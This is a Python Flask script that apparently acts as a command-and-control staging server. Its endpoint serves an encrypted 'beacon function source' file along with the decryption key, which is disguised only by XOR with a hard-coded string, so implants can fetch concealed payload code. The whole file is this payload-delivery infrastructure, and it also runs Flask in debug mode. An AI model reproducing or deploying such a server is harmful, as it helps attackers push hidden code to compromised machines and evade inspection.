from flask import Flask, send_file, jsonify
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64

app = Flask(__name__)
fernet_key = b""
fernet_key_str = ""
fernet_key_str_encrypted = ""
personal_key = "your_own_key"


def xor_encrypt(text, key):
    repeated_key = (key * (len(text) // len(key) + 1))[:len(text)]
    encrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, repeated_key))
    return encrypted

def xor_decrypt(encrypted_text, key):
    repeated_key = (key * (len(encrypted_text) // len(key) + 1))[:len(encrypted_text)]
    decrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(encrypted_text, repeated_key))
    return decrypted


@app.route('/beacon_function_source', methods=['GET'])
def get_beacon_function_source():
    try:
        with open('CAC_beacon_function_source.txt', 'r') as file:
            content = file.read()

        return jsonify({'encrypted': content, 'key': fernet_key_str_encrypted}), 200    # returning the fernet key needed to decrypt the beacon_function_source encrypted with a simple xor encryption
    except Exception as e:
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    with open("en-decryption_key", "rb+") as f:
        fernet_key = f.read()
        if not fernet_key:
            fernet_key = Fernet.generate_key()
            f.seek(0)  # Move to the beginning of the file
            f.write(base64.urlsafe_b64encode(fernet_key))
            f.truncate()  # Ensure file only contains the key
        else:
            fernet_key = base64.urlsafe_b64decode(fernet_key)

        fernet_key_str = base64.urlsafe_b64encode(fernet_key).decode('utf-8')  # Encode the key to a string
        fernet_key_str_encrypted = xor_encrypt(fernet_key_str, personal_key)

    cipher = Fernet(fernet_key)

    app.run(debug=True)
